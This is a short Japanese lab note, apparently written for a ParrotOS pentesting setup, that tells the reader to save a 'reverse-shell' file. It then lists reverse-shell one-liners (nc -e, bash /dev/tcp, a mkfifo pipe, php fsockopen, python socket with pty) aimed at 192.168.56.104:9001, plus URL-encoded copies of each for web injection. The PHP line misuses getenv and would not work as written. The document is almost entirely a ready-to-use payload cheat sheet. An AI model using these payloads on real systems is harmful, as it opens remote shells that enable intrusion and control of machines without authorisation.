- ホームにtoolsディレクトリを作る
- toolsに移動してvimでreverse-shellファイルを作って、以下のをコピーする
- IPアドレスを自分のParrotOSのに変える。ここでは192.168.56.104になっている
- ポート番号は9001

```
nc -e /bin/bash 192.168.56.104 9001

bash -c 'exec bash -i &>/dev/tcp/192.168.56.104/9001 <&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.104 9001 >/tmp/f

php -r '$sock=fsockopen(getenv("192.168.56.104"),getenv("9001"));exec("/bin/sh -i <&3 >&3 2>&3");'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.104",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'


######################################################################################
nc+-e+%2Fbin%2Fbash+192.168.56.104+9001

bash+-c+%27exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F192.168.56.104%2F9001+%3C%261%27

rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+192.168.56.104+9001+%3E%2Ftmp%2Ff

php+-r+%27%24sock%3Dfsockopen%28getenv%28%22192.168.56.104%22%29%2Cgetenv%28%229001%22%29%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27

python+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.56.104%22%2C9001%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport+pty%3B+pty.spawn%28%22%2Fbin%2Fbash%22%29%27


```
